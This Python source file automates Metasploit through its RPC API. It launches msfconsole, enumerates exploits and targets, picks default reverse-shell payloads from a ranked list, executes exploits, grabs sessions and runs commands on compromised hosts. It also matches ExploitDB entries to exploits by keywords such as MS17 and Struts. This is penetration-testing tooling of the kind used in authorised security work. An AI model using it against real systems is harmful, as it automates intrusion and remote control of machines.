import configparser
import time
import signal
import socket
import datetime
from pymetasploit3.msfrpc import MsfRpcClient, MsfConsole

from extra_scripts import *
from json_data_processing_script import Json_monitor

'''
pymetasploit3.msfrpc post request has been customised due to the fact that there wa no timeout in the "post_request" definition (which is a little bit silly)
It is now set at 10.0 seconds.
'''


class Msfrpc:
    '''
    Class related to the Msfrpc's environment
    '''

    def __init__(self):
        # Background color monitor################
        self.color_monitor = Background_printer()
        ##########################################
        # Json and Data Monitor###################
        self.json_and_data_monitor = Json_monitor()
        ##########################################
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.ini'))
        except FileExistsError as err:
            print(self.color_monitor.background_FAIL + '[x] File exists error: {}'.format(err),
                  self.color_monitor.background_ENDC)
            quit()

        # infos related to metasploit
        self.local_port = str(config['Metasploit']['lport'])
        self.proxy_host = str(config['Metasploit']['proxy_host'])
        self.user = str(config['Metasploit']['user'])
        self.password = str(config['Metasploit']['password'])
        self.default_list_payload_sorted = ['windows/meterpreter/reverse_tcp',
                                            'java/meterpreter/reverse_tcp',
                                            'php/meterpreter/reverse_tcp',
                                            'php/meterpreter_reverse_tcp',
                                            'ruby/shell_reverse_tcp',
                                            'cmd/unix/interact',
                                            'cmd/unix/reverse',
                                            'cmd/unix/reverse_perl',
                                            'cmd/unix/reverse_netcat_gaping',
                                            'windows/meterpreter/reverse_nonx_tcp',
                                            'windows/meterpreter/reverse_ord_tcp',
                                            'windows/shell/reverse_tcp',
                                            'generic/shell_reverse_tcp']  # documentation : https://docs.rapid7.com/metasploit/working-with-payloads/

        # infos related to common parameters
        self.service_rpc_password = str(config['Common']['msgrpc_pass'])
        self.service_rpc_port = str(config['Common']['server_port'])

        # stored parameters
        self.client = None
        self.console = None
        self.list_of_exploit = None
        self.list_of_auxiliaries = None
        self.list_of_payloads = None
        self.default_list_payload_per_exploit = None
        self.checkmodule_list_per_exploit = None
        self.targets_list_per_exploit = None
        # current chosen values
        self.current_exploit = None
        self.current_auxiliary = None
        self.current_payload = None

    def launch_metasploit(self):
        '''
        Method used to launch automatically metasploit
        :return:
        '''
        #old version load before september 2021
        #command_init = ["msfdb", "init", "--user", self.user, "--pass", self.password]
        #command_start = ["msfconsole", "-x load msgrpc Pass=" + self.service_rpc_password]
        #new version load due to msfupdate from september 2021
        command_init = ["msfdb", "init", "--component", "database", "--user", self.user, "--pass", self.password]
        command_start = ["msfconsole", "-x load msgrpc Pass=" + self.service_rpc_password]
        FNULL = open(os.devnull, 'w')
        try:
            subprocess.Popen(command_init, stdout=FNULL, stderr=subprocess.STDOUT)
            time.sleep(5)
            subprocess.Popen(command_start, stdout=FNULL, stderr=subprocess.STDOUT)
            time.sleep(10)
            print(self.color_monitor.background_OKGREEN + "[*] Success in launching metasploit" +
                  self.color_monitor.background_ENDC)
        except Exception as e:
            print(self.color_monitor.background_FAIL + "[x] Failed to launch metasploit : {}".format(str(e)),
                  self.color_monitor.background_ENDC)

    def connection_rpc(self):
        '''
        Method used to establish a RPC Connection
        :return:
        '''
        for i in range(0, 3):
            try:
                client = MsfRpcClient(self.service_rpc_password, port=int(self.service_rpc_port), )
                console = MsfConsole(client)
                print(self.color_monitor.background_OKGREEN + "[*] Success in login" +
                      self.color_monitor.background_ENDC)
                # store client and console you got
                self.console = console
                self.client = client
                break

            except Exception as e:
                print(self.color_monitor.background_FAIL + "[x] Failed to login : {}".format(str(e)),
                      self.color_monitor.background_ENDC)

                # write a log about
                text = "{} Failed to log in MSFRPC server : {}".format(
                    datetime.datetime.today().strftime("%d/%m/%Y %H:%M:%S"),
                    str(e)
                )
                self.json_and_data_monitor.write_log(self.json_and_data_monitor.datapath + '/log_file.log',
                                                     text)

        if self.client is None:
            raise Exception("Unable to connect to MSFRPC api")

    def get_exploits(self):
        '''
        Method used to get all the exploits
        :return:
        '''
        self.list_of_exploit = self.client.modules.exploits
        print(
            self.color_monitor.background_OKGREEN + "[*] Get succesfully the list of exploit" + self.color_monitor.background_ENDC)

    def get_auxiliaries(self):
        '''
        Method used to get all the auxiliaries
        :return:
        '''
        self.list_of_auxiliaries = self.client.modules.auxiliary
        print(
            self.color_monitor.background_OKGREEN + "[*] Get succesfully the list of auxiliaries" + self.color_monitor.background_ENDC)

    def get_payloads(self):
        '''
        Method used to get the payloads
        :return:
        '''
        self.list_of_payloads = self.current_exploit.targetpayloads()
        print(
            self.color_monitor.background_OKGREEN + "[*] Get succesfully the list of payloads" + self.color_monitor.background_ENDC)

    def get_default_payload(self):
        '''
        Method used to get the default payload
        :return: dictionary of default payload for each exploit
        '''
        default_payload_dictionary = {}
        loading_iteration = 0

        for exploit in self.list_of_exploit:

            try:

                self.run_an_exploit(exploit)
                list_of_payloads = self.current_exploit.payloads
                for payload in self.default_list_payload_sorted:
                    if payload in list_of_payloads:
                        loading_iteration += 1
                        print(
                            self.color_monitor.background_OKGREEN + "[*] {}/{} Retrieving default payload for exploit {} : {}".format(
                                str(loading_iteration),
                                str(len(self.list_of_exploit)),
                                str(exploit), str(payload)) +
                            self.color_monitor.background_ENDC)
                        default_payload_dictionary[str(exploit)] = str(payload)
                        break

            except Exception as e:
                print(
                    self.color_monitor.background_FAIL + "[x] Failed to get default payload of the exploit {} : {}".format(
                        str(exploit),
                        str(e)),
                    self.color_monitor.background_ENDC)

        self.default_list_payload_per_exploit = default_payload_dictionary

    def get_targets_exploit(self):
        '''
        Method used to get the targets
        :return: dictionnary of the targets
        '''

        checkmodule_exploit_dictonnary = {}
        loading_iteration = 0
        list_of_targets = []
        tmp = []
        flag_check = None

        for exploit in self.list_of_exploit:

            try:

                ######################                          #######################
                ######################USE EXPLOIT IN THE CONSOLE#######################
                for i in range(5):
                    console_data = self.execute_console_command('use ' + str(exploit))
                    ####CHECK IF CONSOLE DID THE EXPECTED BEHAVIOR####
                    if str("msf6 exploit(" + exploit + ")") in console_data['prompt']:
                        flag_check = True
                        break
                    ##################################################
                if flag_check is None:
                    raise Exception(
                        "Console does not work properly, exploit cannot be used, please relaunch it or debug")
                ####RESET FLAG CHECK####
                flag_check = None
                ########################

                ######################                    #############################
                ######################SHOW TARGETS COMMAND#############################
                for i in range(5):
                    console_data = self.execute_console_command('show targets')
                    ####CHECK IF CONSOLE DID THE EXPECTED BEHAVIOR####
                    if str("Id") in console_data['data']:
                        flag_check = True
                        break
                    ##################################################
                if flag_check is None:
                    raise Exception(
                        "Console does not work properly, targets cannot be seen, please relaunch it or debug")
                ####RESET FLAG CHECK####
                flag_check = None
                ########################

                ####################                   ###############################
                ####################EXTRACT THE TARGETS###############################
                list_of_targets = console_data['data']
                list_of_targets = list_of_targets.split('\n')
                ####CLEAR THE NOISY DATA IN THE LIST
                for i in range(len(list_of_targets) + 1):
                    try:
                        list_of_targets.remove('')
                    except:
                        break

                ####SUPPRESS THE USELESS HEADER
                list_of_targets = list_of_targets[3:]

                ####FOR EACH ITEM OF THE LIST, RETRIEVE ONLY THE NAME OF THE TARGET
                for item in list_of_targets:
                    sub_list_of_targets = item.split('  ')
                    tmp.append(sub_list_of_targets[-1])

                ####FINALLY STORE THE DATA
                loading_iteration += 1
                print(
                    self.color_monitor.background_OKGREEN + "[*] {}/{} Retrieving targets option for exploit {} ".format(
                        str(loading_iteration),
                        str(len(self.list_of_exploit)),
                        str(exploit)),
                    self.color_monitor.background_ENDC
                )
                checkmodule_exploit_dictonnary[str(exploit)] = tmp
                tmp = []

            except Exception as e:
                print(
                    self.color_monitor.background_FAIL + "[x] Failed to get targets option of the exploit {} : {}".format(
                        str(exploit),
                        str(e)),
                    self.color_monitor.background_ENDC)

        self.checkmodule_list_per_exploit = checkmodule_exploit_dictonnary

    def get_checkmodule_exploit(self):
        '''
        Method used to get the targets
        :return: dictionnary of the targets
        '''
        # TODO badly shape, reforge it
        checkmodule_exploit_dictonnary = {}
        loading_iteration = 0
        list_of_checkmodule = []
        checkmodule = ''
        flag_check = None

        for exploit in self.list_of_exploit:

            try:

                ######################                          #######################
                ######################USE EXPLOIT IN THE CONSOLE#######################
                for i in range(5):
                    console_data = self.execute_console_command('use ' + str(exploit))
                    ####CHECK IF CONSOLE DID THE EXPECTED BEHAVIOR####
                    if str("msf6 exploit(" + exploit + ")") in console_data['prompt']:
                        flag_check = True
                        break
                    ##################################################
                if flag_check is None:
                    raise Exception(
                        "Console does not work properly, exploit cannot be used, please relaunch it or debug")
                ####RESET FLAG CHECK####
                flag_check = None
                ########################

                ######################                    #############################
                ######################SHOW TARGETS COMMAND#############################
                for i in range(2):
                    console_data = self.execute_console_command('show advanced')
                    ####CHECK IF CHECKMODULE IS IN THE CONSOLE DATA####
                    if str("CheckModule") in console_data['data']:
                        flag_check = True
                        break
                    ##################################################
                if flag_check is None:
                    loading_iteration += 1
                    raise Exception(
                        "Console mights not work properly, checkmodule cannot be seen or mights not exist for this exploit")
                ####RESET FLAG CHECK####
                flag_check = None
                ########################

                ####################                   ###############################
                ####################EXTRACT THE TARGETS###############################
                list_of_checkmodule = console_data['data']
                list_of_checkmodule = list_of_checkmodule.split('\n')
                ####CLEAR THE NOISY DATA IN THE LIST
                for i in range(len(list_of_checkmodule) + 1):
                    try:
                        list_of_checkmodule.remove('')
                    except:
                        break

                ####SUPPRESS THE USELESS HEADER
                list_of_checkmodule = list_of_checkmodule[3:]

                ####FOR EACH ITEM OF THE LIST, LOOK IF CHECKMODULE IS IN THE LIST
                for item in list_of_checkmodule:
                    if 'checkmodule' in item.lower():
                        checkmodule = list_of_checkmodule[list_of_checkmodule.index(item) + 1].split(' ')[-1] + \
                                      list_of_checkmodule[list_of_checkmodule.index(item) + 2].split(' ')[-1]
                        checkmodule = 'auxiliary/scanner' + checkmodule

                ####FINALLY STORE THE DATA
                loading_iteration += 1
                print(
                    self.color_monitor.background_OKGREEN + "[*] {}/{} Retrieving checkmodule option for exploit {} ".format(
                        str(loading_iteration),
                        str(len(self.list_of_exploit)),
                        str(exploit)),
                    self.color_monitor.background_ENDC
                )
                checkmodule_exploit_dictonnary[str(exploit)] = checkmodule
                checkmodule = ''

            except Exception as e:
                print(
                    self.color_monitor.background_FAIL + "[x] {}/{} Failed to get checkmodule option of the exploit {} : {}".format(
                        str(loading_iteration),
                        str(len(self.list_of_exploit)),
                        str(exploit),
                        str(e)),
                    self.color_monitor.background_ENDC)

        self.checkmodule_list_per_exploit = checkmodule_exploit_dictonnary

    def run_an_exploit(self, chosen_exploit):
        '''
        Method used to run an exploit
        :param chosen_exploit: string of the chosen exploit
        :return:
        '''
        try:
            self.current_exploit = self.client.modules.use('exploit', chosen_exploit)
            print(self.color_monitor.background_OKGREEN + "[*] Success in running the exploit : {}".format(
                str(chosen_exploit)),
                  self.color_monitor.background_ENDC)
        except Exception as e:
            print(self.color_monitor.background_FAIL + "[x] Failed to run exploit {} : {}".format(str(chosen_exploit),
                                                                                                  str(e)),
                  self.color_monitor.background_ENDC)

    def run_an_auxiliary(self, chosen_auxiliary):
        '''
        Method used to run an auxiliary
        :param chosen_auxiliary:
        :return:
        '''
        try:
            self.current_auxiliary = self.client.modules.use('auxiliary', chosen_auxiliary)
            print(self.color_monitor.background_OKGREEN + "[*] Success in running the auxiliary : {}".format(
                str(chosen_auxiliary)),
                  self.color_monitor.background_ENDC)
        except Exception as e:
            print(self.color_monitor.background_FAIL + "[x] Failed to run auxiliary : {}".format(str(e)),
                  self.color_monitor.background_ENDC)

    def run_a_payload(self, chosen_payload):
        '''
        Method used to run a specifc payload
        :param chosen_payload:
        :return: payload or -1 if it failed
        '''
        try:
            self.current_payload = self.client.modules.use('payload', chosen_payload)
            print(self.color_monitor.background_OKGREEN + "[*] Success in running the payload : {}".format(
                str(chosen_payload)),
                  self.color_monitor.background_ENDC)
            return self.current_payload
        except Exception as e:
            print(self.color_monitor.background_FAIL + "[x] Failed to run auxiliary : {}".format(str(e)),
                  self.color_monitor.background_ENDC)
            return -1

    def change_option_exploit(self, chosen_option, arg, type_val):
        '''
        Method used to change the option of an exploit
        :param chosen_option: exploit's option that will be change
        :param arg: the value to implement in the option
        :param type_val: if it is STR, INT, or BOOL type
        @return: flag : 1 : success of the change of option ; None : failure
        '''
        flag = None
        try:
            if type_val == "INT":
                arg = int(arg)
            elif type_val == "BOOL":
                arg = bool(arg)
            else:
                self.current_exploit[chosen_option] = arg

            self.current_exploit[chosen_option] = arg
            print(
                self.color_monitor.background_OKGREEN + "[*] Success in changing the option {} with the argument {}".format(
                    str(chosen_option), str(arg)),
                self.color_monitor.background_ENDC)
            flag = 1
        except Exception as e:
            print(self.color_monitor.background_FAIL + "[x] Failed to change option : {}".format(str(e)),
                  self.color_monitor.background_ENDC)

        return flag

    def change_option_auxiliary(self, chosen_option, arg, type_val):
        '''
        Method used to change the option of an auxiliary
        :param chosen_option: auxiliary's option that will be change
        :param arg: the value to implement in the option
        :param type_val: if it is STR, INT, or BOOL type
        @return: flag : 1 : success of the change of option ; None : failure
        '''
        flag = None
        try:
            if type_val == "INT":
                arg = int(arg)
            elif type_val == "BOOL":
                arg = bool(arg)
            else:
                self.current_auxiliary[chosen_option] = arg

            self.current_auxiliary[chosen_option] = arg
            print(
                self.color_monitor.background_OKGREEN + "[*] Success in changing the option {} with the argument {}".format(
                    str(chosen_option), str(arg)),
                self.color_monitor.background_ENDC)
            flag = 1
        except Exception as e:
            print(self.color_monitor.background_FAIL + "[x] Failed to change option : {}".format(str(e)),
                  self.color_monitor.background_ENDC)

        return flag

    def change_option_payload(self, chosen_option, arg, type_val):
        '''
        Method used to change the option of the payload
        :param chosen_option: auxiliary's option that will be change
        :param arg:  the value to implement in the option
        :param type_val: if it is STR, INT, or BOOL type
        @return: flag : 1 : success of the change of option ; None : failure

        '''
        flag = None
        try:
            if type_val == "INT":
                arg = int(arg)
            elif type_val == "BOOL":
                arg = bool(arg)
            else:
                self.current_payload[chosen_option] = arg

            self.current_payload[chosen_option] = arg
            print(
                self.color_monitor.background_OKGREEN + "[*] Success in changing the option {} with the argument {}".format(
                    str(chosen_option), str(arg)),
                self.color_monitor.background_ENDC)
            flag = 1
        except Exception as e:
            print(self.color_monitor.background_FAIL + "[x] Failed to change option : {}".format(str(e)),
                  self.color_monitor.background_ENDC)

        return flag

    def execute_exploit(self):
        '''
        Methode used to execute an exploit
        :return:
        '''
        json_exploit = self.current_exploit.execute(payload=self.current_payload)
        session = -1
        session_id = None
        try:
            if json_exploit['job_id'] is None:
                raise Exception("Bad configuration of exploit")

            time.sleep(15)  # wait cause of the latency of the execution of an exploit

            session_num_list = [*self.client.sessions.list]
            for session_buffer_num in session_num_list:
                if self.client.sessions.list[str(session_buffer_num)]['via_exploit'] == str(
                        self.current_exploit.fullname):
                    session_id = session_buffer_num
            session = self.client.sessions.session(str(session_id))
            print(self.color_monitor.background_OKGREEN + "[*] Successfull execution of the exploit" +
                  self.color_monitor.background_ENDC)
        except Exception as e:
            print(self.color_monitor.background_FAIL + "[x] Failed to execute exploit : {}".format(
                str(self.current_exploit.fullname)),
                  self.color_monitor.background_ENDC)

        if session == -1:
            return -1, -1
        elif len(self.client.sessions.list) == 0:
            print(self.color_monitor.background_FAIL + "[x] Failed to get a session : {}".format(
                str(self.current_exploit.fullname)),
                  self.color_monitor.background_ENDC)
            print(
                self.color_monitor.background_WARNING + "[!] Exploit or payload might not match or might be badly configured" +
                self.color_monitor.background_ENDC)
        return json_exploit, session

    def execute_auxiliary(self):
        '''
        Methode used to execute an auxiliary
        :return:
        '''
        json_auxiliary = self.current_auxiliary.execute()
        session = -1
        time.sleep(20)
        try:
            session_num_list = [*self.client.sessions.list]
            session_id = session_num_list[-1]
            session = self.client.sessions.session(str(session_id))
            print(self.color_monitor.background_OKGREEN + "[*] Successfull execution of the auxiliary" +
                  self.color_monitor.background_ENDC)
        except Exception as e:
            print(self.color_monitor.background_FAIL + "[x] Failed to execute auxiliary : {}".format(str(e)),
                  self.color_monitor.background_ENDC)

        if session == -1:
            return -1, -1
        elif len(session) == 0:
            print(self.color_monitor.background_FAIL + "[x] Failed to get a session : {}".format(str(e)),
                  self.color_monitor.background_ENDC)
            print(
                self.color_monitor.background_WARNING + "[!] Exploit or payload might not match or might be badly configured" +
                self.color_monitor.background_ENDC)
        return json_auxiliary, session

    def execute_command(self, cmd, session):
        '''
        Methode to execute a command
        @param cmd: str command
        @param session: session
        @return: the content dispaly by the shell of the meterpreter
        :return:
        '''
        if "Meterpreter" in str(type(session)):
            terminating_strs = ['----END----']
            return session.run_with_output(cmd, terminating_strs, timeout=10, timeout_exception=False)
            # 10 seconds max

        elif "Shell" in str(type(session)):
            session.write(cmd)
            return session.read()

    def execute_console_command(self, cmd):
        output = None
        try:
            self.console.write(str(cmd))
            time.sleep(2)
            while self.console.is_busy():
                time.sleep(3)
            output = self.console.read()
        except Exception as e:
            print(self.color_monitor.background_FAIL + "[x] Failed to execute command : {}".format(str(e)),
                  self.color_monitor.background_ENDC)
        return output

    # TODO change method db_retrieve
    #################################### Deprecated functions #################################################
    ###########################################################################################################
    def retrieve_exploit_from_db_info(self, list_of_rows):
        '''
        @param list_of_rows: list of the row extracted from exploitdb after a research
        @param client: rpc metasploit client
        @return: possible exploit according to the database of exploitdb
        '''
        # define keyword global
        keyword_global = ['SMB', 'smb', 'Smb']  # 'Windows', 'windows', 'WINDOWS', 'Server', 'SERVER', 'server',
        keyword_special = ['ms20', 'Ms20', 'MS20', 'ms19', 'Ms19', 'MS19', 'ms18', 'Ms18', 'MS18', 'ms17', 'Ms17',
                           'MS17',
                           'ms16', 'Ms16', 'MS16', 'ms15', 'Ms15', 'MS15', 'ms14', 'Ms14', 'MS14', 'ms13', 'Ms13',
                           'MS13',
                           'ms12', 'Ms12', 'MS12', 'ms11', 'Ms11', 'MS11', 'ms10', 'Ms10', 'MS10', 'ms09', 'Ms09',
                           'MS09',
                           'ms08', 'Ms08', 'MS08', 'ms07', 'Ms07', 'MS07', 'ms06', 'Ms06', 'MS06', 'ms05', 'Ms05',
                           'MS05',
                           'ms04', 'Ms04', 'MS04', 'ms03', 'Ms03', 'MS03', 'ms02', 'Ms02', 'MS02', 'ms01', 'Ms01',
                           'MS01',
                           'JMX', 'jmx', 'Jmx', 'RMI', 'rmi', 'Rmi', 'manageengine', 'MANAGEENGINE', 'ManageEngine',
                           'tomcat', 'TOMCAT', 'Tomcat', 'struts', 'STRUTS', 'Struts']

        # define data row's container
        ## variables of the row
        row_data = {}
        global_keyword_list = []
        special_keyword_list = []

        ## variables of the rows
        id_row = 1
        rows_data = {}

        # create the dictionary of the rows
        # seek word key global and special in rows' data and store it
        for row in list_of_rows:
            for item in row:
                for keyword in keyword_global:
                    if keyword in item:
                        global_keyword_list.append(keyword)
                for keyword in keyword_special:
                    if keyword in item:
                        special_keyword_list.append(keyword)
                        ###########################################CORRELATION PART !!!!!!!#################################
                        ######CORRELATION RMI-JMX##################
                        if keyword in ['RMI', 'rmi', 'Rmi']:
                            special_keyword_list.append('JMX')
                        if keyword in ['tomcat', 'TOMCAT', 'Tomcat']:
                            special_keyword_list.append('STRUTS')

                # pdb.set_trace()

                if len(special_keyword_list) != 0:
                    row_data['global'] = global_keyword_list
                    row_data['special'] = special_keyword_list
                    rows_data[str(id_row)] = row_data

                    # reset variable of the row
                    row_data = {}
                    global_keyword_list = []
                    special_keyword_list = []

                # increment the id_row
                id_row = id_row + 1

        # pdb.set_trace()
        # if nothing is found ...
        if len(rows_data) == 0:
            return -1

        # seek the relative exploit for each row (forged on rows_data)

        # create new list
        new_list = []
        end_list = []
        # miles_dist = []
        exploits_chosen = []

        # generate list_of exploit
        self.get_exploits()

        for row in rows_data.items():
            # first search with the global to reduce the loss of time (cause we are going to use damerau levenshtein distance's algorithm after)
            for keyword in row[1]["global"]:
                for exploit in self.list_of_exploit:
                    if keyword.lower() in exploit and exploit not in new_list:
                        new_list.append(exploit)

        # if no global was set, new_list is empty !!!!!!
        if len(new_list) == 0:
            new_list = self.list_of_exploit

        # then search special keyword
        for row in rows_data.items():
            for keyword in row[1]["special"]:
                for remaining in new_list:
                    if keyword.lower() in remaining and remaining not in end_list:
                        end_list.append(remaining)

        exploits_chosen = end_list

        return exploits_chosen
